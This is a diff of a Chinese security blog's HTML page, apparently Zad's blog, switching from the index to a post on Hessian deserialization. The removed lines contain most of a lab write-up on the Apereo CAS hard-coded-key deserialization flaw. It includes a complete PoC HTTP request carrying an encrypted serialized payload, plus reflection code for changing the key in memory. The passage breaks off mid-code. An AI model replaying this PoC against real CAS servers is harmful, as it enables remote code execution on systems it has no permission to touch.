@@ -20,30 +20,62 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="不忘初心,方得始终">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Zad&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="很奇怪我mac下的环境执行命令会不稳定会崩溃，直接使用开发机中的idea吧 gadget2种路径入口： Hessian2 hashCode&#x2F;equals&#x2F;compareTo except构造obj触发toString 1Content-Type: x-application&#x2F;hessian or application&#x2F;x-hessian    漏洞原理漏洞原理1调用栈如下 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hessian反序列化">
+<meta property="og:url" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Zad&#39;s blog">
-<meta property="og:description" content="不忘初心,方得始终">
+<meta property="og:description" content="很奇怪我mac下的环境执行命令会不稳定会崩溃，直接使用开发机中的idea吧 gadget2种路径入口： Hessian2 hashCode&#x2F;equals&#x2F;compareTo except构造obj触发toString 1Content-Type: x-application&#x2F;hessian or application&#x2F;x-hessian    漏洞原理漏洞原理1调用栈如下 1">
 <meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904114641-enlnnn7.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115913-hc6q5mn.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904115952-rwrghhs.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904140809-q14qkmg.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904141636-v09m2f3.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904153734-hagtqvk.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904154540-do0qbjh.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161543-z4x9xqd.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904161657-qkx9brj.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162117-zgzq4vs.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162446-fy70s6o.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904162510-ei1f4n9.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904163110-zhkjs8m.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152415-mtjjg1c.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906152503-dr10gnt.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906151905-v5b8rzv.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170756-ax3oeow.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906170805-d8gmuln.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230906154411-eejfuuv.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904170813-kwgwvd1.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904171413-n9qzpzo.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212214-05oycdz.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212259-moufpru.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904213458-ib7l4pj.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142314-qhkqqj7.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901142935-zfbnfpc.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230901143010-sx4hrzn.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165100-3mo9phg.png">
+<meta property="og:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165624-osqm0xw.png">
+<meta property="article:published_time" content="2022-04-09T10:18:15.000Z">
+<meta property="article:modified_time" content="2024-03-09T10:29:32.224Z">
 <meta property="article:author" content="zad">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904114641-enlnnn7.png">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zn-CN'
   };
 </script>
 
-  <title>Zad's blog</title>
+  <title>hessian反序列化 | Zad's blog</title>
   
 
 
@@ -141,9 +173,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
@@ -159,10 +192,9 @@
       <meta itemprop="name" content="Zad's blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">hessian反序列化</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          hessian反序列化
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -192,7 +224,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>很奇怪我mac下的环境执行命令会不稳定会崩溃，直接使用开发机中的idea吧</p>
+        <p>很奇怪我mac下的环境执行命令会不稳定会崩溃，直接使用开发机中的idea吧</p>
 <p>gadget2种路径入口：</p>
 <p>Hessian2 hashCode&#x2F;equals&#x2F;compareTo</p>
 <p>except构造obj触发toString</p>
@@ -311,148 +343,30 @@
 <p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230831165624-osqm0xw.png" alt="image"></p>
 <h3 id><a href="#" class="headerlink" title></a></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#jndi-ldap-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96--pojonode-%E8%A7%A6%E5%8F%91-templatesimpl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/11961</span></span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="zad">
-      <meta itemprop="description" content="不忘初心,方得始终">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Zad's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">cas反序列化漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-09 17:52:12" itemprop="dateCreated datePublished" datetime="2022-03-09T17:52:12+08:00">2022-03-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-03-09 17:58:25" itemprop="dateModified" datetime="2024-03-09T17:58:25+08:00">2024-03-09</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>cas反序列化是历史漏洞，通过存在的默认keychangeit解码触发反序列化漏洞</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用的是vulhub的环境，下载后修改docker-compose.yml文件，添加一个debug后的debug后的端口10080</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line"> web:</span><br><span class="line">   image: vulhub/apereo-cas:<span class="number">4.1</span><span class="number">.5</span></span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    - <span class="string">&quot;10080:10080&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>启动容器后，进入容器内部修改catalina.sh，设置为debug模式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CATALINA_OPTS=<span class="string">&quot;-Xdebug -Xrunjdwp:transport=dt_socket,address=10080,server=y,suspend=n&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后退出容器，重启容器，即可远程dbeug</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>由于是历史漏洞，那么我们就可以把整个流程倒过来，先复现漏洞，然后再去分析cas系统如何处理请求。</p>
-<p>由于个人习惯我喜欢在DispatcherServlet#doDispatch方法上的ha.handle代码处打断点，当前的ha对象为SelectiveFlowHandlerAdapter，我们可以handle方法</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114165938-81bpg7c.png" alt="image"></p>
-<p>来到的是FlowHandlerAdapter类，通过查看继承关系，发现SelectiveFlowHandlerAdapter类是FlowHandlerAdapter的子类，所以这里来处理请求的是FlowHandlerAdapter类，接着会通过getFlowExecutionKey方法去获取获取execution参数(该参数就是前端传入payload的地方)，</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114170305-ngq15oc.png" alt="image"></p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114154233-uo27pyg.png" alt="image"></p>
-<p>接着通过调用resumeExecution方法，主要是对传入的payload值进行解析</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114171306-5b3w8pw.png" alt="image"></p>
-<p>跟如parseFlowExecutionKey方法，会调用pase方法来解析execution参数，以_分割成数组tokens，token[0]为uuid，token[1]的值为base64字节码，最后将uuid赋值给ClientFlowExecutionKey类中的UUID id, byte[] data</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114154630-360tmud.png" alt="image"></p>
-<p>返回到resumeExecution方法中，又会调用getFlowExecution方法对我们token[1]，也就是_后的base64字节码进行解密</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114172320-qvz5bq7.png" alt="image"></p>
-<p>在getFlowExecution方法中，会判断当前key是否继承ClientFlowExecutionKey，通过getdata方法获取data的值 也就是我们tokens[1]的值，接着对获取到的值进行decode解密操作，跟入</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114173914-hz10j6d.png" alt="image"></p>
-<p>在解密过程中调用的加密方式为AES_CBC_PKCS7，秘钥为changeit ，该秘钥也是造成该漏洞的主要条件之一类似shiro一样硬编码在jar包中，后续直接就readObject触发反序列化漏洞。</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114172159-2e3nvyb.png" alt="image"></p>
-<p>整个漏洞利用链是比较简单的，那么我们来分析如何去触发这个漏洞，cas是怎么去解析请求的，首先看web.xml，我们看看加载那些配置文件，有一个基础的servlet映射，cas对应的处理类交给了spring dispatcherservlet加载了&#x2F;WEB-INF&#x2F;cas-servlet.xml配置文件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;</span><br><span class="line">        /WEB-INF/spring-configuration<span class="comment">/*.xml</span></span><br><span class="line"><span class="comment">        /WEB-INF/deployerConfigContext.xml</span></span><br><span class="line"><span class="comment">        &lt;!-- this enables extensions and addons to contribute to overall CAS&#x27; application context</span></span><br><span class="line"><span class="comment">             by loading spring context files from classpath i.e. found in classpath jars, etc. --&gt;</span></span><br><span class="line"><span class="comment">        classpath*:/META-INF/spring/*.xml</span></span><br><span class="line"><span class="comment">    &lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">&lt;/context-param&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;servlet&gt;</span></span><br><span class="line"><span class="comment">    &lt;servlet-name&gt;cas&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">    &lt;servlet-class&gt;</span></span><br><span class="line"><span class="comment">        org.springframework.web.servlet.DispatcherServlet</span></span><br><span class="line"><span class="comment">    &lt;/servlet-class&gt;</span></span><br><span class="line"><span class="comment">    &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-value&gt;/WEB-INF/cas-servlet.xml, /WEB-INF/cas-servlet-*.xml&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/init-param&gt;</span></span><br><span class="line"><span class="comment">    &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-name&gt;publishContext&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">        &lt;param-value&gt;false&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/init-param&gt;</span></span><br><span class="line"><span class="comment">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span></span><br><span class="line"><span class="comment">&lt;/servlet&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="comment">    &lt;servlet-name&gt;cas&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">&lt;/servlet-mapping&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在cas-servlet中定义了不同的请求对应不同的Executor、Repository等方法去处理</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114185856-mjo18xx.png" alt="image"></p>
-<h3 id="为什么login可以触发logout却无法触发"><a href="#为什么login可以触发logout却无法触发" class="headerlink" title="为什么login可以触发logout却无法触发"></a>为什么login可以触发logout却无法触发</h3><p>主要来看我们拿到的flowExecutor的区别，该类的作用就是获取不同的Executor去调用对应的Repository去解析payload，而只有当Repository等于ClientFlowExecutionRepository解析的时候才会触发存在反序列化漏洞</p>
-<p>这个是logout</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114184256-p0lld21.png" alt="image"></p>
-<p>login的时候</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114184228-0no6cd2.png" alt="image"></p>
-<p>那cas是怎么判断去拿对应的Executor的呢，定义在xml文档中</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221114185856-mjo18xx.png" alt="image"></p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /cas/login;jsessionid=879B7DBB8DC93BBFD9898264228306BC HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span><span class="number">.132</span><span class="number">.192</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.2</span>; Win64; x64; rv:<span class="number">106.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">106.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 1250</span></span><br><span class="line"><span class="comment">Origin: http://172.16.132.192:8080</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://172.16.132.192:8080/cas/login</span></span><br><span class="line"><span class="comment">Cookie: JSESSIONID=879B7DBB8DC93BBFD9898264228306BC</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=admin&amp;password=123456&amp;lt=LT-4-lkMwKHquamVTHCH7Lbb3WnVrMdsZPx-cas01.example.org&amp;execution=744c8069-b862-4866-895f-5fa285f683ea_AAAAIgAAABDV%2BDns5EoKdlW9xIwP6glaAAAABmFlczEyOKWIQQgzRiGCxj%2FhN3jn2kaRsbU9gumxfADt1ZenTe22%2BiWMBzdzQatn%2FZOTt7Yh4j7SRftNWDJEODyHxpR%2B9fwR9CG1a94uDzK5jTdcsq9C7SEsgJzGtA5LG4v5wOlC4D57mW16%2B8K0bMsPdzIBMZYut2WWJGkBNkG2Ne2Q6EX%2F%2FQp5KFhXP3dPvVHsgD0Rqx1NnrwNAuV8HRE8LBT84Z38MpAKMwW7OOqLM6xtqQ5OUZ5HNZRImL3QrqfYH5MXgEYMifMzI%2F%2BKKvdnnC8wXOdEN%2F2cnqqJ4AHJKP51NgxOvuYbjme6JolkqFaiqeGwL17glUsPlparLvvd8EVSbLVQNkRzINQlYxrhZ%2BJXdVhbWRotIkWAFqdJ1nBCyBdKGbZWEdxcnMtxWAD6pIodMxNRBhyugeIUDtv4TtMACU6TMkK80Z6jx0kZOB32rmjyC1XfXWudmHwqHyIklVD1%2FUOxWqlF%2BX0hGxWoZXWolOSbxYEJ%2Fxt951WavKHbThyqP023UIRGX2V1WjuRbBRjgu8wuJ9BerLPaV9mZEYVPKqqduc9aCtyP8qByv8tUkySxBx6zHZvA%2FDPZSWKjpdYDfotJTgYaqoouUKgprhqTfLv%2FALeHkjOrzDqHi7%2BYvr%2FVXwSh%2B6fR9RHea6Txy6r%2FA9UAeJjkfK7spoZrdy1osTKPolCQbuMvVzIDG6idGpapl2AvyLP6mMg88ktZsQRpKH4ab8P803FiZT8l%2FklfRSmpASvkBVhe2XuacCsUl7CK2k1soUrFWG50gcYyQOx6ToTSfR%2BbclZuKpk%2BEhziiknOjmbv44EFjQtLZLBMcQUs5egdrX76eWgPY00a%2BSdOG3NVSym%2FQ2IK6Bg114jSLDPld1DrvMA3OIL%2BmVeFnQLAUF%2FkH1Vt8i441n7oJXDQdJ4ltwrYkIWk3biHl77Ma2lrrohPqOUpsRUeLPullg5OQoKXT5yoZUl6jVj86PtXPY%3D&amp;_eventId=submit&amp;submit=LOGIN</span></span><br></pre></td></tr></table></figure>
+        
 
 
-
-
-
-<h2 id="cas反序列化拓展攻击-修改key"><a href="#cas反序列化拓展攻击-修改key" class="headerlink" title="cas反序列化拓展攻击-修改key"></a>cas反序列化拓展攻击-修改key</h2><p>在日常攻防演习中不仅我们要防守裁判也要防守友商进入内网，我们知道该漏洞关键的漏洞点就是需要知道编码的key(类似于shiro)，那么在我们已有的反序列化漏洞前提下是否可以修改key，拒绝漏洞进一步利用呢，答案是可行的</p>
-<p>设置秘钥有2种方式，第一种就是默认硬编码在key里，第二种就是写在配置文件中，两个方法都是通过BufferedBlockcipherBean对象去设置key</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115154405-zs8r2zw.png" alt="image"></p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115154421-jk23auv.png" alt="image"></p>
-<p>发现其中的setKeyPassword方法是在bufferedBlockCipherBean类的父类的父类AbstractCipherBean对象中，那么思路就很清晰通过内存对象搜索哪里可以拿到AbstractCipherBean对象，调用setKeyPassword方法即可。</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115154552-aafzip3.png" alt="image"></p>
-<p>但是搜索了整个漏洞触发时候的调用栈没找到可以拿到AbstractCipherBean对象，于是查看类的继承结构发现有两个子类AbstractBlockCipherBean和BufferedBlockCipherBean</p>
-<p><img src="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221115154814-ppj6ko8.png" alt="image"></p>
-<p>分别进行内存对象搜索可以成功拿到BufferedBlockCipherBean对象，整个调用栈如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; </span><br><span class="line">  ---&gt; threadLocals = &#123;java.lang.ThreadLocal$ThreadLocalMap&#125; </span><br><span class="line">   ---&gt; table = &#123;class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;&#125; </span><br><span class="line">    ---&gt; [<span class="number">22</span>] = &#123;java.lang.ThreadLocal$ThreadLocalMap$Entry&#125; </span><br><span class="line">     ---&gt; value = &#123;org.springframework.webflow.mvc.servlet.MvcExternalContext&#125; </span><br><span class="line">      ---&gt; requestMap = &#123;org.springframework.webflow.core.collection.LocalAttributeMap&#125; </span><br><span class="line">       ---&gt; attributes = &#123;java.util.Map&lt;java.lang.String, V&gt;&#125; </span><br><span class="line">        ---&gt; [org.springframework.web.servlet.DispatcherServlet.CONTEXT] = &#123;org.springframework.web.context.support.XmlWebApplicationContext&#125; </span><br><span class="line">          ---&gt; beanFactory = &#123;org.springframework.beans.factory.support.DefaultListableBeanFactory&#125; </span><br><span class="line">                     ---&gt; singletonObjects = &#123;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&#125; </span><br><span class="line">                      ---&gt; [loginFlowCipherBean] = &#123;org.cryptacular.bean.BufferedBlockCipherBean&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过反射拿到了BufferedBlockCipherBean对象，可以看到该对象现在默认的key为changit</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line"><span class="type">Field</span> <span class="variable">threadLocals</span> <span class="operator">=</span> thread.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;threadLocals&quot;</span>);</span><br><span class="line">threadLocals.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">ThreadLocalMap</span> <span class="operator">=</span> threadLocals.get(thread);</span><br><span class="line"><span 